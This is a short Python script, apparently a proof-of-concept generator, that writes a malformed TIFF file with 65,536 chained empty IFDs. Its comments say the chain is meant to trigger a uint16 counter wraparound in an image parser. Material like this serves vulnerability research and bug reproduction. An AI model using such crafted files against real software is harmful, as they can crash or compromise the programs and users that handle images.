#!/usr/bin/env python3
import struct, os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")
N = 65536  # number of IFDs needed to trigger uint16 wrap

# Header: little-endian, magic 42, first IFD at offset 8
header = b'\x49\x49' + struct.pack('<H', 42) + struct.pack('<I', 8)

# Build 65536 IFDs, each: count=0 (2 bytes) + next_offset (4 bytes)
# IFD[i] is at offset: 8 + i*6
# IFD[i].next_offset = 8 + (i+1)*6  for i < N-1
# IFD[N-1].next_offset = 0  (end of chain)
ifds = bytearray()
for i in range(N):
    count = struct.pack('<H', 0)
    if i < N - 1:
        next_off = struct.pack('<I', 8 + (i + 1) * 6)
    else:
        next_off = struct.pack('<I', 0)
    ifds += count + next_off

data = header + bytes(ifds)
with open(OUT, 'wb') as f:
    f.write(data)
print(f"Written {len(data)} bytes to {OUT}")
